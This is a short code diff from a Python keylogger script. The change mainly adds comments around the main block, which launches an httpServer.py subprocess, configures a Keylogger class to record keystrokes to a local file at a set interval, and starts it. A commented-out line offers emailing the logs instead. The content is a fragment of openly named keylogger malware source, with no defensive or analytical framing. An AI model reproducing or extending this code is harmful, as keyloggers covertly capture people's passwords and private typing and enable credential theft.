@@ -17,7 +17,7 @@ class Keylogger:
     start_time = 0
 
     def __init__(self, interval, report_method="file"):
-        # we gonna pass SEND_REPORT_EVERY to interval
+        # pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
         # this is the string variable that contains the log of all 
@@ -118,8 +118,16 @@ if __name__ == "__main__":
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file 
     # (and then send it using your favorite method)
+
+    #Popen runs httpServer script as a subprocess
     process = Popen(['python3', os.path.realpath('httpServer.py')])
+
+    #sets up configuration of keylogger object
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+
+    #begins keylogging
     keylogger.start()
+    
+    #Does not run as of now, use control-c to terminate keylogger
     input('Press ENTER to exit')
     process.kill()
